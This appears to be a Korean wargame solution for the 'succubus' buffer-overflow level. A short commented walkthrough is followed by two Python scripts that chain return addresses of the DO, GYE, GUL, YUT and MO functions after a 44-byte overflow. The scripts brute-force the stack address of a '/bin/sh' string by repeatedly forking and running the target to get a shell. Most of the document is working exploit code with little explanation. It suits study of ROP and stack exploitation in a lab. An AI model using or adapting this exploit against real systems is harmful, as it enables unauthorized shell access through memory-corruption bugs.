'''
전형적인 ROP 이해 문제

* objdump, readelf를 사용해서 DO,GYE,GUL,YUT,MO 함수 찾기
 - objdump -d succubus | grep DO
 => 0x80487ec
 - readelf -s succubus | grep FUNC

1. gdb로 ret주소에 break point를 걸고 어떻게 동작하는지 확인 해보자.

2. 소스파일을 한 개 copy 한 뒤 마지막에 printf("%p\n",&buffer); 명령을 넣어서 buffer의 주소를 알아낸다.

3. buffer의 주소에서 오프셋 값을 더해서 /bin/sh의 위치를 찾는다.
 a=0xbffffa70
 b=44+28
 print(hex(a+b))
  =>0xbffffab8

4. 익스플로잇!
"a"*44 + &DO + &GYE + &GUL + &YUT + &MO + dummy + &/bin/sh + "/bin/sh"
./succubus `python -c 'print "a"*44+"\xec\x87\x04\x08"+"\xbc\x87\x04\x08"+"\x8c\x87\x04\x08"+"\x5c\x87\x04\x08"+"\x24\x87\x04\x08"+"abcd"+"\x98\xfa\xff\xbf"+"/bin/sh"'`


'''



import os,sys,struct

target=os.getcwd()+"/"+sys.argv[1]

DO=0x80487ec
GYE=0x80487bc
GUL=0x804878c
YUT=0x804875c
MO=0x8048724

for h in range(0xff,0x00,-1):
	for l in range(0x00,0x100,1):
		payload="a"*44
		payload=payload+struct.pack('<L',DO)
		payload=payload+struct.pack('<L',GYE)
		payload=payload+struct.pack('<L',GUL)
		payload=payload+struct.pack('<L',YUT)
		payload=payload+struct.pack('<L',MO)
		payload=payload+"abcd"+chr(l)+chr(h)+"\xff\xbf"
		payload=payload+"/bin/sh"
		pid = os.fork()
		if pid==0:
			os.execl(target,target,payload)
		else:
			os.waitpid(pid,0)






import os,sys,re,struct

def Str2Dec(str):		#16진수 주소값 8자리를 한개씩 입력받아서 10진수로 변환후 계산
	i=7
	sum=0
	for x in str:
		tmp=0
		if x=='a':	calc=10
		elif x=='b':	calc=11
		elif x=='c':	calc=12
		elif x=='d':	calc=13
		elif x=='e':	calc=14
		elif x=='f':	calc=15
		else:	calc=int(x)
		if i==0:
			sum=sum+calc
		else:
			tmp=16**i
			tmp=tmp*calc
			sum=sum+tmp
		i=i-1

	return sum

def GetFuncAddr():
	os.system("objdump -t succubus | grep DO | awk '{print$1}' > Func.txt")
	os.system("objdump -t succubus | grep GYE | awk '{print$1}' >> Func.txt")
	os.system("objdump -t succubus | grep GUL | awk '{print$1}' >> Func.txt")
	os.system("objdump -t succubus | grep YUT | awk '{print$1}' >> Func.txt")
	os.system("objdump -t succubus | grep MO | awk '{print$1}' >> Func.txt")
	fp = open("./Func.txt","r")
	result=fp.read()
	funclist = re.findall('\w+',result)
	fp.close()
	os.unlink("./Func.txt")
	return funclist

funclist = GetFuncAddr()

DO=Str2Dec(funclist[0])
GYE=Str2Dec(funclist[1])
GUL=Str2Dec(funclist[2])
YUT=Str2Dec(funclist[3])
MO=Str2Dec(funclist[4])

print DO,GYE,GUL,YUT,MO


target=os.getcwd()+"/"+sys.argv[1]

for addr in range(0xbffff000,0xbffffff0,4):
	payload=""
	payload=payload+"\x90"*44
	payload=payload+struct.pack("<I",DO)
	payload=payload+struct.pack("<I",GYE)
	payload=payload+struct.pack("<I",GUL)
	payload=payload+struct.pack("<I",YUT)
	payload=payload+struct.pack("<I",MO)
	payload=payload+"abcd"
	payload=payload+struct.pack("<I",addr)
	payload=payload+"/bin/sh"
	pid = os.fork()
	if pid==0:
		os.execv(target,('lhj',payload))
	else:
		os.waitpid(pid,0)













